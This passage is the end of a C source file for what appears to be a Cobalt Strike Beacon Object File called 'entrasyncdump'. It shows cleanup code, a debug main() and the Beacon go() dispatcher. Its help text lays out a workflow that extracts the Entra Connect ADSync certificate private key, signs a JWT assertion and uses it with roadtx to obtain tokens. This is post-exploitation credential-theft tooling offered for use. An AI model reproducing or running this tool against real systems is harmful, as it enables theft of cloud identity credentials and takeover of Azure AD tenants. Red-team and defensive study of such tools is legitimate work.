    if (adSyncPrivateConfig) BofHeapFree(adSyncPrivateConfig);
    if (sqlStmtHandle) API(ODBC32, SQLFreeHandle)(SQL_HANDLE_STMT, sqlStmtHandle);
    if (sqlConnected) API(ODBC32, SQLDisconnect)(sqlConnHandle);
    if (sqlConnHandle) API(ODBC32, SQLFreeHandle)(SQL_HANDLE_DBC, sqlConnHandle);
    if (sqlEnvHandle) API(ODBC32, SQLFreeHandle)(SQL_HANDLE_ENV, sqlEnvHandle);
    if (sqlConnectionString) BofHeapFree(sqlConnectionString);
    return;
}


// Main entrypoint
#ifdef _DEBUG
void main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: entrasyncdump <version|dumpcertinfo|dumpcert|help> [args...]\n");
        return;
    }

    if (strcmp(argv[1], "version") == 0) {
        cmd_version();
    } else if (strcmp(argv[1], "dumpcertinfo") == 0) {
        wchar_t wInstance[64] = { 0 };
        CONST wchar_t* instanceArg = NULL;
        if (argc >= 3 && argv[2][0]) {
            for (int i = 0; argv[2][i] && i < 63; i++) wInstance[i] = (wchar_t)argv[2][i];
            instanceArg = wInstance;
        }
        cmd_dumpcertinfo(instanceArg);
    } else if (strcmp(argv[1], "dumpcert") == 0) {
        if (argc < 5) {
            printf("Usage: entrasyncdump dumpcert <thumbprint> <client_id> <tenant_id>\n");
            return;
        }
        cmd_dumpcert(argv[2], argv[3], argv[4]);
    } else {
        printf("Unknown command '%s'. Usage: entrasyncdump <version|dumpcertinfo|dumpcert|help> [args...]\n", argv[1]);
    }
}
#else
void go(PCHAR args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);
    CHAR* cmd = BeaconDataExtract(&parser, NULL);

    if (!cmd || API(MSVCRT, strlen)(cmd) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: entrasyncdump <version|dumpcertinfo|dumpcert|help>\n");
        return;
    }

    if (API(MSVCRT, strncmp)(cmd, "help", 5) == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "entrasyncdump - Entra Connect (Azure AD Connect) certificate dumper\n\n"
            "Usage: entrasyncdump <command> [args...]\n\n"
            "Commands:\n"
            "  version      - Read installed Entra Connect version, SQL instance name, and auth type\n"
            "  dumpcertinfo - Check for ABA/certificate auth, enumerate cert thumbprints,\n"
            "                 and extract the application/client ID\n"
            "  dumpcert     - Extract ADSync CNG private key and build a signed JWT assertion\n"
            "                 for ABA certificate-based authentication\n"
            "  help         - Show this help message\n\n"
            "Arguments:\n"
            "  dumpcertinfo [instancename]  - Optional LocalDB instance name override\n"
            "  dumpcert <thumbprint> <client_id> <tenant_id>\n"
            "                              - Certificate thumbprint (40 hex chars),\n"
            "                                application/client ID, and Azure AD tenant ID\n\n"
            "Workflow:\n"
            "  1. Run 'version' to check Entra Connect version and auth type\n"
            "  2. Run 'dumpcertinfo' to get the cert thumbprint and client ID\n"
            "  3. Run 'dumpcert <thumbprint> <client_id> <tenant_id>' to extract\n"
            "     the private key and generate a signed JWT assertion\n"
            "  4. Use the assertion with roadtx or a direct token request\n"
        );
        return;
    }

    if (API(MSVCRT, strncmp)(cmd, "version", 8) == 0) {
        cmd_version();
        return;
    }

    if (API(MSVCRT, strncmp)(cmd, "dumpcertinfo", 13) == 0) {
        // Optional second argument: LocalDB instance name override
        CHAR* instanceArgA = BeaconDataExtract(&parser, NULL);
        WCHAR instanceArgW[64] = { 0 };
        CONST WCHAR* instanceOverride = NULL;
        if (instanceArgA && API(MSVCRT, strlen)(instanceArgA) > 0) {
            toWideChar(instanceArgA, instanceArgW, 64);
            instanceOverride = instanceArgW;
        }
        cmd_dumpcertinfo(instanceOverride);
        return;
    }

    if (API(MSVCRT, strncmp)(cmd, "dumpcert", 9) == 0) {
        // Required arguments: thumbprint, client_id, tenant_id
        CHAR* thumbprint = BeaconDataExtract(&parser, NULL);
        CHAR* client_id  = BeaconDataExtract(&parser, NULL);
        CHAR* tenant_id  = BeaconDataExtract(&parser, NULL);

        if (!thumbprint || API(MSVCRT, strlen)(thumbprint) == 0 ||
            !client_id  || API(MSVCRT, strlen)(client_id)  == 0 ||
            !tenant_id  || API(MSVCRT, strlen)(tenant_id)  == 0) {
            BeaconPrintf(CALLBACK_ERROR,
                "Usage: entrasyncdump dumpcert <thumbprint> <client_id> <tenant_id>\n"
                "  thumbprint - Certificate thumbprint (40 hex chars) from dumpcertinfo\n"
                "  client_id  - Application/Client ID from dumpcertinfo\n"
                "  tenant_id  - Azure AD tenant ID (GUID or domain)\n"
            );
            return;
        }

        cmd_dumpcert(thumbprint, client_id, tenant_id);
        return;
    }

    BeaconPrintf(CALLBACK_ERROR, "Unknown command '%s'. Run 'entrasyncdump help' for usage.\n", cmd);
}
#endif
